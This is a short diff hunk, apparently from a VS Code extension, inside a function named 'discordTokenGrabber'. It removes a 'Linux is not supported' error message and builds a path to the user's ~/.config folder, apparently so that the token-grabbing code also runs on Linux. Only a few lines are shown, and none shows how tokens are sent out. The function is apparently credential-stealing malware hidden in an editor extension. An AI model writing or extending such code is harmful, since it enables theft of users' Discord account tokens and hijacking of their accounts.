@@ -53,7 +53,6 @@ function discordTokenGrabber () {
         }
     }
     else if (computerPlatform == "linux") {
-        vscode.window.showErrorMessage("Linux is not supported for the moment 😥");
         
         const home = path.join(process.env.HOME, ".config");
 
